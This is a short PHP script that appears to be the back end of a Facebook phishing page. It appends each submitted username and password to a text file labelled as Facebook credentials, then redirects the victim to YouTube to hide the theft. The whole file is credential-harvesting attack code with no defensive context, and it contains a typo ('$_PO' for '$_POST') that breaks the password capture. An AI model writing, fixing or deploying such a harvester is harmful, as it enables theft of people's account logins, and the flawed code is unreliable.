<?php
file_put_contents("usernames.txt", "Facebook Username: " . $_POST['username'] . " Pass: " . $_PO['password'] . "\n", FILE_APPEND);
header('Location: https://www.youtube.com/');
exit();
?>